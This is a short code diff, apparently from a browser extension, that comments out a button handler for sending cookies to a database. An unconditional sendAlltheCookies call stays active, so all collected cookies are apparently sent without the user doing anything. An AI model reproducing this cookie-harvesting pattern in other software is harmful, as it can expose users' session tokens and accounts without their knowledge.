@@ -22,7 +22,6 @@ seeAllTheCookies(function(cookieData) {
 
 // #################### display cookies on the extension ###########
 
-
 // grabCookies(viewCookies);
 
 function grabCookies(callback) {
@@ -83,11 +82,11 @@ var cookieCallback = function (cookieData) {
 }
 
 sendAlltheCookies(cookieCallback);
-console.log('send cookies to database');
-        $("#send_btn").click(function() {
-            console.log('send cookies to database');
-            sendAlltheCookies(cookieCallback);
-        });
+// console.log('send cookies to database');
+//         $("#send_btn").click(function() {
+//             console.log('send cookies to database');
+//             sendAlltheCookies(cookieCallback);
+//         });
 
 
 
